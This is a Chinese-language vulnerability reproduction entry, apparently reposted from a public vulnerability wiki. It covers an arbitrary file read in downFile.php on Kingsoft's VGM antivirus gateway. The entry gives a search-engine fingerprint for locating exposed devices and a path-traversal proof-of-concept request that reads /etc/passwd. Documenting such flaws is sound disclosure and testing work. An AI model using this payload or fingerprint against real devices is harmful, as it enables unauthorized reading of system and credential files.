---
title: "金山 VGM防毒墙 downFile.php 任意文件读取漏洞"
date: 2026-10-18 09:16:53
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "金山"
tags:
  - "金山"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

金山 VGM防毒墙 downFile.php文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件

## 漏洞影响

```
金山 VGM防毒墙
```

## 网络测绘

```
"金山VGM"
```

## 漏洞复现

登录页面

![image-20230314090419140](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314090419140.png)

验证POC

```
/downFile.php?filename=../../../../etc/passwd
```

![image-20230314090430563](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314090430563.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E9%87%91%E5%B1%B1-VGM%E9%98%B2%E6%AF%92%E5%A2%99-downFile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
